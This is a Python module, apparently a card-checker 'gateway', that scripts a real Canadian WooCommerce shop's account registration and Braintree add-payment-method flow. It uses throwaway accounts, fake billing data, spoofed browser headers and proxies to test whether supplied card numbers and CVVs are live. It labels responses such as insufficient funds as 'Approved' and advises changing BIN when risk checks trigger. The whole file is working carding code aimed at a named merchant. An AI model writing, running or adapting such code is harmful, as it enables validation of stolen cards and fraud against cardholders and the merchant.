from httpx import AsyncClient, RequestError, TimeoutException
import random
import string
import json
import base64
import asyncio
from faker import Faker
import logging
# - - - - - - - - - - - - - -  #
logging.basicConfig(level=logging.ERROR)
# - - - - - - - - - - - - - -  #
async def get_str(data: str, first: str, last: str) -> str:
    return str(data).split(str(first))[1].split(str(last))[0]
# - - - - - - - - - - - - - -  #
async def get_random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

# ----- [ Gateway ] ----- #
async def gateway_woo(cc, month, year, cvc, proxyg):
    try:
        email = await get_random_string(8) + "@gmail.com"
        password = await get_random_string(10)
        # - - - - - - - - - - - - - -  #
        browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
        os = ['Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64', 'Windows NT 6.1', 'iPhone; CPU iPhone OS 13_5 like Mac OS X']
        versions = ['86.0', '87.0', '88.0', '89.0', '90.0']
        user_agent = f"Mozilla/5.0 ({random.choice(os)}) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{random.choice(versions)}"
        # - - - - - - - - - - - - - -  #
        def generate_random_headers():
            sec_ch_ua = random.choice([
            'Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            ])
            sec_ch_ua_mobile = random.choice(['?0', '?1'])
            sec_ch_ua_platform = random.choice(['Windows','macOS','Linux','Android','iOS'])
            # - - - - - - - - - - - - - -  #
            return {
            'sec-ch-ua': sec_ch_ua,
            'sec-ch-ua-mobile': sec_ch_ua_mobile,
            'sec-ch-ua-platform': sec_ch_ua_platform
        }
            # - - - - - - - - - - - - - -  #
        
        # Estableciendo la Session (requests)
        async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as session:
            myip = await session.get("https://api.ipify.org/")
            response = await session.get('https://www.abnclean.ca/my-account')
            register_nonce = await get_str(response.text, 'woocommerce-register-nonce" value="', '"')
            if not register_nonce:
                return 'Dead! 😔', "Register Nonce ❌ (ERROR)"
            headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user_agent,
            }

            data = {
            'email': email,
            'password': password,
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
            }
            # - - - - - - - - - - - - - -  #
            response = await session.post('https://www.abnclean.ca/my-account', headers=headers, data=data)
            response = await session.post('https://www.abnclean.ca/my-account/edit-address/billing')
            billing_nonce = await get_str(response.text, 'woocommerce-edit-address-nonce" value="'  ,'"')
            if not billing_nonce:
                return 'Dead! 😔', "Billing Nonce ❌ (ERROR)"
            fake = Faker()
            data = {
        'billing_first_name': fake.first_name(),
        'billing_last_name': fake.last_name(),
        'billing_company': fake.company(),
        'billing_country': "CA",
        'billing_address_1': "630, 5e avenue (route 158)",
        'billing_city': "Saint-Jérôme",
        'billing_state': "Quebec",
        'billing_postcode': "J7Z 7L9",
        'billing_phone': fake.phone_number(),
        'billing_email': fake.email(),
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': billing_nonce,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }
            
            response = await session.post('https://www.abnclean.ca/my-account/edit-address/billing', headers=headers, data=data)
            response = await session.get("https://www.abnclean.ca/my-account/add-payment-method/")

            token =  await get_str(response.text,'client_token_nonce":"','"')
            payment_nonce = await get_str(response.text, 'woocommerce-add-payment-method-nonce" value="', '"')
            
            random_headers = generate_random_headers()
            headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.abnclean.ca',
            'priority': 'u=1, i',
            'referer': 'https://www.abnclean.ca/my-account/add-payment-method/',
            'sec-ch-ua': random_headers['sec-ch-ua'],
            'sec-ch-ua-mobile': random_headers['sec-ch-ua-mobile'],
            'sec-ch-ua-platform': random_headers['sec-ch-ua-platform'],
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest',
            }

            data = { 
                'action': 'wc_braintree_credit_card_get_client_token', 
                'nonce': token, 
            }
            
            req7 = await session.post('https://www.abnclean.ca/wp-admin/admin-ajax.php', data=data, headers=headers)
            client_token = req7.json()['data']
            B64_ = base64.b64decode(client_token)
            finger = json.loads(B64_)['authorizationFingerprint']

            headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'authorization': 'Bearer '+ finger,
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': random_headers['sec-ch-ua'],
            'sec-ch-ua-mobile': random_headers['sec-ch-ua-mobile'],
            'sec-ch-ua-platform': random_headers['sec-ch-ua-platform'],
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user_agent,
            }

            json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '2c26f150-0bf2-4f58-ae3b-3953e9e63f36',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': month,
                        'expirationYear': year,
                        'cvv': cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
            }

            req8 = await session.post('https://payments.braintree-api.com/graphql', json=json_data, headers=headers)
            card_token = req8.json()['data']['tokenizeCreditCard']['token']

            headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.abnclean.ca',
            'priority': 'u=0, i',
            'referer': 'https://www.abnclean.ca/my-account/add-payment-method/',
            'sec-ch-ua': random_headers['sec-ch-ua'],
            'sec-ch-ua-mobile': random_headers['sec-ch-ua-mobile'],
            'sec-ch-ua-platform': random_headers['sec-ch-ua-platform'],
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
            }

            data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': card_token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
            }
            req9 = await session.post('https://www.abnclean.ca/my-account/add-payment-method/',  data=data, headers=headers) 
            with open("gg.html", "w") as archivo:
                archivo.write(req9.text)
            # ----- [ Respuesta del Gateway ] ----- # 
        
                if "Payment method successfully added." in req9.text:
                    mensaje = "1000: Approved ✅"
                    status = "Approved ✅"
                else:
                    mensaje = req9.text.split('Status code ')[1].split('		</li>')[0]
                    if "Card Issuer Declined CVV" in mensaje:
                        status = "Approved ✅"
                    elif "Insufficient Funds" in mensaje:
                        status = "Approved ✅"
                    elif "Gateway Rejected: risk_threshold" in mensaje:
                        status = "Declined ❌"
                        mensaje = "RISK:CAMBIA DE BIN ❌"
                    else:
                        status = "Declined ❌"
        return status,mensaje
    except (RequestError, TimeoutException, json.JSONDecodeError) as e:
        logging.error(f"An error occurred: {e}")
        return 'An unexpected error occurred. Request Error.😓', 'Error⚠️!'
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        return 'An unexpected error occurred.😓', 'Error ⚠️!'